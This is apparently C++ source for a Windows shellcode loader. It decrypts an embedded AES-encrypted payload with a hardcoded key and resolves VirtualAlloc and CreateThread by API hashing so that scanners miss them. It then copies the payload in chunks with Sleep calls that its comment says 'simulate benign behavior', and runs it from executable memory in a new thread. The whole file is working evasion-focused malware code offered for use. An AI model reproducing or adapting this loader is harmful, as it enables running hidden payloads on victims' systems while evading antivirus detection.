#include<iostream>
#include<vector>
#include "Headers/aes.h"
#include<iomanip>
#include<windows.h>


void print_hex(const std::vector<uint8_t>& data, const std::string& label = "") {
    if (!label.empty()) {
        std::cout << label << ": ";
    }
    std::cout << std::hex << std::setfill('0');
    for (uint8_t b : data) {
        std::cout << std::setw(2) << static_cast<int>(b);
    }
    std::cout << std::dec << std::endl; // Reset to decimal for general output
}


DWORD djb2_hash(const char *str) {
    DWORD hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + *str;
        str++;
    }
    return hash;
}


FARPROC get_api_by_hash(HMODULE hModule, DWORD target_hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)hModule + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hModule + rva);

    DWORD *names = (DWORD *)((BYTE *)hModule + exp->AddressOfNames);
    WORD *ordinals = (WORD *)((BYTE *)hModule + exp->AddressOfNameOrdinals);
    DWORD *functions = (DWORD *)((BYTE *)hModule + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *func_name = (char *)((BYTE *)hModule + names[i]);
        if (djb2_hash(func_name) == target_hash) {
            return (FARPROC)((BYTE *)hModule + functions[ordinals[i]]);
        }
    }
    return NULL;
}

int Ground(const std::vector<uint8_t>& decrypted) {
    std::vector<uint8_t> first, second, third, fourth;

    int chunk_size = decrypted.size() / 4;

    first.insert(first.end(), decrypted.begin(), decrypted.begin() + chunk_size);
    second.insert(second.end(), decrypted.begin() + chunk_size, decrypted.begin() + 2 * chunk_size);
    third.insert(third.end(), decrypted.begin() + 2 * chunk_size, decrypted.begin() + 3 * chunk_size);
    fourth.insert(fourth.end(), decrypted.begin() + 3 * chunk_size, decrypted.end());

    // Print them in hex
    // print_hex(first, "First Block");
    // print_hex(second, "Second Block");
    // print_hex(third, "Third Block");
    // print_hex(fourth, "Fourth Block");
  

 DWORD hash = djb2_hash("VirtualAlloc");
FARPROC va = get_api_by_hash(GetModuleHandleA("kernel32.dll"), hash);
LPVOID mem=((LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))va)(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


if (mem == NULL) {
 
    return 1;
}


//     // Assume first, second, third, fourth are vectors from your earlier split
memcpy((BYTE*)mem + 0,              first.data(),  first.size());
Sleep(100); // Optional delay to simulate benign behavior
memcpy((BYTE*)mem + first.size(),   second.data(), second.size());
Sleep(100);
memcpy((BYTE*)mem + first.size() + second.size(), third.data(), third.size());
Sleep(100);
memcpy((BYTE*)mem + first.size() + second.size() + third.size(), fourth.data(), fourth.size());


DWORD hash_2 = djb2_hash("CreateThread");
FARPROC ct = get_api_by_hash(GetModuleHandleA("kernel32.dll"), hash_2);
HANDLE hThread = ((HANDLE(WINAPI*)(
    LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))ct)(
        NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);


if (hThread) {

    WaitForSingleObject(hThread, INFINITE);
} 
   

    // Close handle to thread

    CloseHandle(hThread);

    // Free allocated memory

   VirtualFree(mem, 0, MEM_RELEASE);
    return 0;


}



std::vector<uint8_t> remove_pkcs7_padding(const std::vector<uint8_t>& padded_data) {
    if (padded_data.empty()) {
        return {};
    }

    uint8_t padding_value = padded_data.back();
    if (padding_value == 0 || padding_value > padded_data.size()) {
        // Invalid padding value or padding length exceeds data size
        throw std::runtime_error("Invalid PKCS#7 padding.");
    }

    // Check if all padding bytes have the correct value
    for (size_t i = 0; i < padding_value; ++i) {
        if (padded_data[padded_data.size() - 1 - i] != padding_value) {
            throw std::runtime_error("Invalid PKCS#7 padding (byte mismatch).");
        }
    }

    // Return a new vector without the padding
    return std::vector<uint8_t>(padded_data.begin(), padded_data.end() - padding_value);
}

// Helper to print bytes in hexadecimal



int main(){

    // Hardcoded AES key (MUST match the key used for encryption)
    uint8_t key[] = {
        0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
        0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C
    }; // AES128 key (16 bytes)

    // Hardcoded Initialization Vector (IV) (MUST match the IV used for encryption)
    uint8_t iv[] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0A
    };

    // Replace this with YOUR ENCRYPTED SHELLCODE from the previous run.
    // This is an example placeholder. Make sure it matches the padded length from encryption.
    // Example: If your original shellcode was 65 bytes, and it was padded to 80 bytes for encryption,
    // this encrypted_shellcode_data should be 80 bytes long.
     std::vector<uint8_t> ciphertext_bytes= {
0x64, 0x35, 0x66, 0xc1, 0x74, 0xf4, 0x48, 0x33, 0x00, 0x9d, 0x9b, 0x6f, 0x78, 0x75, 0xb9, 0x37, 
    0x5c, 0x0d, 0x3f, 0x15, 0x52, 0xdc, 0xce, 0x5d, 0x64, 0xcb, 0xa5, 0x50, 0xb2, 0xc5, 0x3c, 0x3f, 
    0x20, 0xd0, 0x2e, 0xaf, 0x82, 0xf0, 0xaf, 0x4e, 0x6c, 0x96, 0x17, 0x91, 0x84, 0x76, 0x42, 0xc3, 
    0x06, 0xc3, 0xe3, 0x1d, 0xf4, 0x67, 0xd2, 0x7c, 0x7e, 0x3b, 0x95, 0xdd, 0x65, 0xdc, 0xc6, 0xa9, 
    0xaf, 0x5b, 0xf9, 0xab, 0x8c, 0x69, 0x7a, 0xad, 0xe4, 0x1f, 0xf8, 0x7d, 0xc2, 0x61, 0xda, 0xe8, 
    0xf9, 0xb6, 0xca, 0x87, 0x06, 0x59, 0x21, 0x1d, 0xac, 0xf6, 0x01, 0x10, 0xb8, 0x40, 0xf4, 0x52, 
    0xfc, 0x5b, 0xf0, 0x22, 0x08, 0xaf, 0x8f, 0x2c, 0x0a, 0x33, 0x30, 0xfc, 0x9b, 0xa7, 0x28, 0x2d, 
    0xba, 0x34, 0x02, 0x8e, 0x5f, 0xe2, 0x52, 0xc1, 0xdb, 0x16, 0x1a, 0x2c, 0x59, 0xc2, 0x50, 0x15, 
    0xec, 0xd5, 0x35, 0x87, 0xc6, 0xec, 0x13, 0x84, 0x08, 0xbf, 0x84, 0x9e, 0x67, 0x6b, 0x93, 0x48, 
    0x72, 0x6b, 0x65, 0x60, 0xe1, 0x19, 0xf1, 0x72, 0xbc, 0x86, 0xd5, 0x9a, 0xdb, 0x0b, 0x69, 0x1a, 
    0x0c, 0x81, 0x2a, 0x34, 0x84, 0xff, 0x23, 0x48, 0x6f, 0x15, 0x35, 0x5a, 0x63, 0xf9, 0x56, 0x6a, 
    0xed, 0x98, 0x99, 0xe5, 0x9f, 0xfa, 0x56, 0xfe, 0xa8, 0xe7, 0xb2, 0x92, 0x4e, 0xc9, 0x80, 0x0a, 
    0x94, 0xd4, 0xda, 0x2e, 0xc0, 0xac, 0xaf, 0x26, 0x40, 0x05, 0xb9, 0x2d, 0xa1, 0xde, 0xfb, 0x52, 
    0xfb, 0xba, 0x8e, 0x5f, 0x58, 0x58, 0x7b, 0x11, 0x5e, 0x3c, 0x3a, 0xaf, 0xbc, 0x70, 0x20, 0x2c, 
    0xaf, 0x02, 0xc4, 0x4f, 0x1a, 0xbf, 0x2c, 0x5d, 0x76, 0xca, 0xfa, 0x16, 0x82, 0x2b, 0x07, 0x15, 
    0x5f, 0xcc, 0x63, 0x1f, 0x00, 0x1a, 0xfe, 0xc5, 0x6d, 0xbf, 0x5f, 0xbc, 0x65, 0x0d, 0x46, 0xdd, 
    0x88, 0x14, 0xcc, 0xd7, 0x53, 0xdf, 0x5f, 0x44, 0x4d, 0x39, 0x7f, 0x29, 0xfc, 0x54, 0xb4, 0x52, 
    0x7b, 0x5a, 0x94, 0xaf, 0x73, 0xf1, 0x4e, 0xab, 0xbc, 0x5e, 0x7d, 0xc8, 0xd3, 0xe6, 0x66, 0x4e, 
    0x44, 0x9d, 0x1b, 0x53, 0x67, 0x06, 0x32, 0x03, 0x14, 0xa2, 0x1c, 0x89, 0x2b, 0xd5, 0x91, 0xe7, 
    0x50, 0x3a, 0x5a, 0xa2, 0xc0, 0x08, 0x79, 0xcc, 0x5d, 0x70, 0x82, 0x66, 0x28, 0xe1, 0x05, 0x18, 
    0x91, 0x82, 0xd2, 0xe6, 0xb6, 0xc5, 0x4e, 0xa2, 0xee, 0x22, 0x3b, 0xb5, 0x10, 0x99, 0x7b, 0x78, 
    0x50, 0xb8, 0x5f, 0x38, 0xcf, 0xa6, 0xac, 0x70, 0x71, 0x40, 0xf5, 0xb3, 0x5e, 0x0b, 0x3a, 0x02, 
    0xa1, 0xaf, 0x1d, 0xa1, 0xb7, 0x87, 0xf3, 0x02, 0x5a, 0xb2, 0xcd, 0x3d, 0xcd, 0xe4, 0xec, 0x05, 
    0x52, 0x48, 0xe3, 0x7c, 0x7d, 0x95, 0xbe, 0x74, 0xd7, 0x5d, 0x1e, 0xc9, 0xfd, 0x03, 0xcc, 0x8c, 
    0xd3, 0x54, 0xb5, 0x62, 0x50, 0xbc, 0x69, 0x46, 0xf9, 0x98, 0x1c, 0x59, 0xbf, 0xd2, 0x2c, 0x76, 
    0x7f, 0x44, 0xaa, 0x21, 0xad, 0xba, 0x4f, 0xea, 0x7d, 0x5f, 0x51, 0x30, 0x23, 0xde, 0x3f, 0x48, 
    0xd5, 0x40, 0x29, 0x7e, 0x89, 0x5f, 0x7f, 0x3c, 0x06, 0xf4, 0x7b, 0x9a, 0xc4, 0x5b, 0x29, 0x75, 
    0xf6, 0x50, 0x2b, 0xa6, 0x04, 0xe1, 0xe5, 0xe4, 0x4d, 0xb5, 0x69, 0x37, 0x01, 0x88, 0x83, 0x38, 
    0x85, 0x4f, 0x8d, 0xfe, 0x3b, 0xbd, 0x86, 0x6a, 0x74, 0xeb, 0xc8, 0x70, 0xfa, 0xd9, 0x36, 0x38
    };




    // Prepare buffer for decrypted bytes
    std::vector<uint8_t> decrypted_bytes(ciphertext_bytes.size());
    std::vector<uint8_t> recovered_shellcode_bytes;

    // Context for AES operation
    struct AES_ctx ctx;

    // --- Decryption ---
    try {
        // Initialize AES context with the key
        AES_init_ctx(&ctx, key);

        // Copy IV to a temporary buffer for decryption
        uint8_t current_iv_decrypt[AES_BLOCKLEN];
        memcpy(current_iv_decrypt, iv, AES_BLOCKLEN);

        // Set the IV for decryption
        AES_ctx_set_iv(&ctx, current_iv_decrypt);

        // Decrypt the ciphertext buffer
        // Note: AES_CBC_decrypt_buffer modifies the input buffer in-place
        std::vector<uint8_t> decrypt_temp_buffer = ciphertext_bytes; // Work on a copy
        AES_CBC_decrypt_buffer(&ctx, decrypt_temp_buffer.data(), decrypt_temp_buffer.size());

        print_hex(decrypt_temp_buffer);

        

        // Copy decrypted data
        std::copy(decrypt_temp_buffer.begin(), decrypt_temp_buffer.end(), decrypted_bytes.begin());

        print_hex(decrypted_bytes, "\nDecrypted (padded) hex");








        // Remove PKCS#7 padding from the decrypted data
        recovered_shellcode_bytes = remove_pkcs7_padding(decrypted_bytes);
        std::cout << "Recovered Shellcode Length (unpadded): " << recovered_shellcode_bytes.size() << " bytes" << std::endl;
        print_hex(recovered_shellcode_bytes, "Recovered Shellcode (hex)");
         Ground(recovered_shellcode_bytes);

        // In a real loader, you would now take `recovered_shellcode_bytes`
        // and prepare it for execution (e.g., allocate executable memory, copy bytes, execute).


    } catch (const std::exception& e) {
        std::cerr << "Decryption Error: " << e.what() << std::endl;
        return 1;
    }





}
